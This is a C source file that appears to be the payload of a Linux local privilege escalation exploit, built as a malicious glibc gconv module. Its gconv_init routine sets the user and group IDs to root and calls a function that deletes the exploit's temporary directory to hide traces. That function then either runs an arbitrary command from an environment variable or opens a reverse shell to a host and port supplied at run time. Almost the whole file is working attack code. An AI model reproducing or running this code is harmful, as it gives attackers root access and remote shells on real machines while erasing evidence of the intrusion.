#include <gconv.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>

char* envp[] = { "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin", NULL};

void tcp_connect(char * host, int port) {
    struct sockaddr_in revsockaddr;

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr(host);

    connect(sock, (struct sockaddr *) &revsockaddr,
            sizeof(revsockaddr));
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, envp);
}

void reverse_shell(char * host) {
    char * delimiter = ":";

    char *ptr = strtok(host, delimiter);
    if (!ptr) exit(2);
    char * ip = ptr;

    ptr = strtok(NULL, delimiter);
    if (!ptr) exit(3);;
    int port = atoi(ptr);
    if (!port) exit(4);;

    tcp_connect(ip, port);
}

/*
 * Malicious function called as root
 */
void malici0us()
{
    char *argv[] = {"/bin/sh", NULL};

    // Retrieve command and exploit directory from environment variables
    char * const command = getenv("COMMAND");
    char * const dir = getenv("PKDIR");
    char * const rev = getenv("REV");
    if ((!command && !rev) || !dir) {
        exit(1);
    }

    // Clean trails by removing environment variables and exploit temporary directory
    unsetenv("COMMAND");
    unsetenv("PKDIR");
    unsetenv("REV");
    chdir("/");

    char * rmrf = "/usr/bin/rm -rf";
    char * mute = "> /dev/null";

    // As the exploit somewhat does not allow multiple memory allocations,
    // creation a common buffer of the greatest size between path and payload
    int max_len;
    int path_len = strlen(rmrf) + strlen(dir) + strlen(mute) + strlen("\00");
    int payload_len = strlen(command) + strlen("\"\"") + strlen("\00");

    max_len = (path_len > payload_len) ? path_len : payload_len;
    char * string_buffer = malloc(sizeof(char) * max_len);

    // Remove exploit files
    sprintf(string_buffer, "%s %s %s", rmrf, dir, mute);
    system(string_buffer);

    if (strcmp(rev, "") != 0) {
        reverse_shell(rev);
    } else {
        sprintf(string_buffer, "\"%s\"", command);

        char* argv[] = {"/bin/sh", "-c", string_buffer, NULL};
        execve(argv[0], argv, envp);
    }
}

/*
 * Called upon shared object loading by glibc.
 */
int gconv_init (struct __gconv_step *step)
{
    // Run this process and subprocesses as root
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);

    // Execute payload
    malici0us();

    return __GCONV_OK;
}

/*
 * glibc checks for this function when loading the shared object. It
 * is never called, but if it does not exist, an assertion fails.
 */
int gconv(struct __gconv_step *step)
{
    return __GCONV_OK;
}
